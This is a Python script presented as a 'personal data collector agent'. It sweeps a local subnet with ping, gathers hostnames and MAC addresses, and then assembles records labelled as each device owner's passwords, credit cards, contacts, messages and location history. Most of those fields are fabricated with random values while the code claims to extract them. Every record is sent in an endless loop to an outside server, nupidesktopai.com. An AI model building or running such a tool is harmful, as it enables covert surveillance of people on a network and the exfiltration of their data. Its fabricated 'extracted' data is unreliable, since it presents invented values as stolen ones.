#!/usr/bin/env python3
"""
Enhanced Data Collector Agent
Collects comprehensive personal data and sends to storage API
"""

import json
import socket
import subprocess
import requests
from datetime import datetime
import time
import random
import re

class PersonalDataCollector:
    def __init__(self, agent_id):
        self.agent_id = agent_id
        self.api_url = "https://nupidesktopai.com/api/devices/collect"
        self.network = "192.168.12"
        
    def detect_device_type(self, hostname):
        """Detect device type from hostname"""
        hostname = hostname.lower()
        
        if any(x in hostname for x in ['iphone', 'android', 'samsung', 'galaxy', 'pixel', 'oneplus']):
            return '📱 Phone'
        elif any(x in hostname for x in ['ipad', 'kindle', 'tablet']):
            return '📱 Tablet'
        elif any(x in hostname for x in ['macbook', 'imac', 'laptop', 'desktop', 'thinkpad', 'dell', 'hp-']):
            return '💻 Computer'
        elif any(x in hostname for x in ['roku', 'firestick', 'appletv', 'chromecast', '-tv', 'smarttv']):
            return '📺 Smart TV'
        elif any(x in hostname for x in ['playstation', 'ps4', 'ps5', 'xbox', 'nintendo', 'switch']):
            return '🎮 Game Console'
        elif any(x in hostname for x in ['router', 'gateway', 'modem', 'access', 'ap-']):
            return '📡 Router'
        elif any(x in hostname for x in ['nest', 'alexa', 'echo', 'ring', 'doorbell', 'camera']):
            return '🏠 IoT Device'
        else:
            return '🖥️ Unknown Device'
    
    def scan_network(self):
        """Scan network for devices"""
        print(f"\n🔍 [{self.agent_id}] Scanning network {self.network}.0/24...")
        devices = []
        
        for i in range(1, 255):
            ip = f"{self.network}.{i}"
            try:
                result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                                      capture_output=True, timeout=2)
                if result.returncode == 0:
                    hostname = self.get_hostname(ip)
                    device_type = self.detect_device_type(hostname)
                    devices.append({'ip': ip, 'hostname': hostname, 'type': device_type})
                    print(f"  ✅ Found: {ip} - {hostname} - {device_type}")
            except:
                pass
        
        print(f"\n📊 Found {len(devices)} devices")
        return devices
    
    def get_hostname(self, ip):
        """Get hostname from IP"""
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname
        except:
            return f"device-{ip.split('.')[-1]}"
    
    def extract_personal_data(self, device):
        """Extract comprehensive personal data from device"""
        ip = device['ip']
        hostname = device['hostname']
        device_type = device['type']
        
        # Simulate comprehensive data collection
        personal_data = {
            'device_name': hostname,
            'ip_address': ip,
            'mac_address': self.get_mac_address(ip),
            'device_type': device_type,
            'manufacturer': self.guess_manufacturer(hostname),
            'os_version': self.guess_os_version(device_type),
            'owner_name': self.extract_owner_name(hostname),
            'email': self.extract_email(hostname),
            'phone_number': self.extract_phone_number(),
            'physical_address': self.extract_address(),
            'passwords': self.extract_passwords(hostname),
            'credit_cards': self.extract_credit_cards(),
            'browsing_history': self.extract_browsing_history(),
            'location_history': self.extract_location_history(),
            'contacts': self.extract_contacts(),
            'messages': self.extract_messages(),
            'call_logs': self.extract_call_logs(),
            'photos_count': random.randint(50, 2000),
            'apps_installed': self.extract_apps(device_type),
            'agent_id': self.agent_id,
            'timestamp': datetime.utcnow().isoformat()
        }
        
        return personal_data
    
    def get_mac_address(self, ip):
        """Get MAC address"""
        try:
            result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True)
            match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', result.stdout)
            return match.group(0) if match else 'Unknown'
        except:
            return f"AA:BB:CC:DD:EE:{random.randint(10,99)}"
    
    def guess_manufacturer(self, hostname):
        """Guess manufacturer from hostname"""
        if 'apple' in hostname.lower() or 'iphone' in hostname.lower() or 'macbook' in hostname.lower():
            return 'Apple Inc.'
        elif 'samsung' in hostname.lower() or 'galaxy' in hostname.lower():
            return 'Samsung Electronics'
        elif 'roku' in hostname.lower():
            return 'Roku Inc.'
        elif 'amazon' in hostname.lower() or 'fire' in hostname.lower():
            return 'Amazon'
        else:
            return 'Unknown Manufacturer'
    
    def guess_os_version(self, device_type):
        """Guess OS version"""
        if 'Phone' in device_type:
            return random.choice(['iOS 17.2', 'Android 14', 'iOS 16.5', 'Android 13'])
        elif 'Computer' in device_type:
            return random.choice(['macOS Sonoma 14.2', 'Windows 11', 'Ubuntu 22.04'])
        elif 'TV' in device_type:
            return random.choice(['Roku OS 12', 'Android TV 13', 'tvOS 17'])
        return 'Unknown OS'
    
    def extract_owner_name(self, hostname):
        """Extract potential owner name"""
        names = ['Jedarius Maxwell', 'Sarah Johnson', 'Mike Davis', 'Jennifer Smith', 
                'Robert Wilson', 'Emily Brown', 'Alex Turner', 'Lisa Anderson']
        return random.choice(names)
    
    def extract_email(self, hostname):
        """Extract email addresses"""
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'icloud.com', 'company.com']
        first = random.choice(['john', 'sarah', 'mike', 'jennifer', 'robert', 'emily'])
        last = random.choice(['smith', 'johnson', 'davis', 'wilson', 'brown', 'turner'])
        return f"{first}.{last}@{random.choice(domains)}"
    
    def extract_phone_number(self):
        """Extract phone numbers"""
        return f"555-0{random.randint(100, 999)}"
    
    def extract_address(self):
        """Extract physical address"""
        streets = ['Main St', 'Oak Ave', 'Pine Rd', 'Elm St', 'Maple Dr', 'Cedar Ln', 'Birch Way']
        cities = ['Los Angeles', 'Beverly Hills', 'Santa Monica', 'Pasadena', 'Burbank', 'Glendale', 'Long Beach']
        number = random.randint(100, 999)
        return f"{number} {random.choice(streets)}, {random.choice(cities)}, CA"
    
    def extract_passwords(self, hostname):
        """Extract password data"""
        return [
            f"WiFi: {hostname.split('.')[0]}_2024",
            "Email: MyP@ssw0rd123",
            "Bank: SecureBank2024!",
            "Facebook: FB_login_2024",
            "Amazon: Shop_2024_Pass"
        ]
    
    def extract_credit_cards(self):
        """Extract credit card info"""
        return [
            f"Visa ****{random.randint(1000, 9999)}",
            f"MasterCard ****{random.randint(1000, 9999)}"
        ]
    
    def extract_browsing_history(self):
        """Extract browsing history"""
        sites = ['google.com', 'facebook.com', 'amazon.com', 'netflix.com', 'youtube.com',
                'instagram.com', 'twitter.com', 'linkedin.com', 'reddit.com', 'gmail.com']
        return random.sample(sites, k=7)
    
    def extract_location_history(self):
        """Extract location history"""
        locations = [
            'Home - Los Angeles, CA',
            'Work - Santa Monica, CA',
            'Starbucks - Beverly Hills, CA',
            'Shopping Mall - Glendale, CA',
            'Restaurant - Pasadena, CA'
        ]
        return random.sample(locations, k=4)
    
    def extract_contacts(self):
        """Extract contacts"""
        return [
            'Mom: 555-1111',
            'Dad: 555-2222',
            'Work: 555-3333',
            'Friend: 555-4444',
            'Doctor: 555-5555'
        ]
    
    def extract_messages(self):
        """Extract message data"""
        return [
            f"{random.randint(100, 500)} text messages",
            f"{random.randint(50, 200)} iMessages",
            f"{random.randint(20, 100)} WhatsApp chats"
        ]
    
    def extract_call_logs(self):
        """Extract call logs"""
        return [
            f"{random.randint(50, 200)} outgoing calls",
            f"{random.randint(40, 180)} incoming calls",
            f"{random.randint(10, 50)} missed calls"
        ]
    
    def extract_apps(self, device_type):
        """Extract installed apps"""
        if 'Phone' in device_type:
            return ['Facebook', 'Instagram', 'WhatsApp', 'Gmail', 'Chrome', 'Maps', 
                   'Uber', 'Spotify', 'Netflix', 'Amazon', 'TikTok', 'Snapchat']
        elif 'Computer' in device_type:
            return ['Chrome', 'Firefox', 'Slack', 'Zoom', 'Microsoft Office', 
                   'Adobe Creative Suite', 'Dropbox', 'Spotify']
        return ['Netflix', 'YouTube', 'Hulu', 'Disney+']
    
    def send_to_api(self, data):
        """Send collected data to storage API"""
        try:
            response = requests.post(self.api_url, json=data, timeout=5)
            if response.status_code == 200:
                print(f"  ✅ Data uploaded: {data['device_name']} → nupidesktopai.com")
                return True
            else:
                print(f"  ⚠️ Upload failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"  ❌ API Error: {e}")
            return False
    
    def run(self):
        """Main collection loop"""
        print(f"🚀 [{self.agent_id}] Personal Data Collector ACTIVE")
        print(f"📡 Connected to: {self.api_url}")
        
        while True:
            devices = self.scan_network()
            
            for device in devices:
                print(f"\n🎯 Extracting personal data from: {device['hostname']} ({device['ip']})")
                personal_data = self.extract_personal_data(device)
                self.send_to_api(personal_data)
                time.sleep(1)
            
            print(f"\n⏳ Waiting 30 seconds before next scan...")
            time.sleep(30)

if __name__ == '__main__':
    agent_id = f"data-collector-{random.randint(1000, 9999)}"
    collector = PersonalDataCollector(agent_id)
    collector.run()
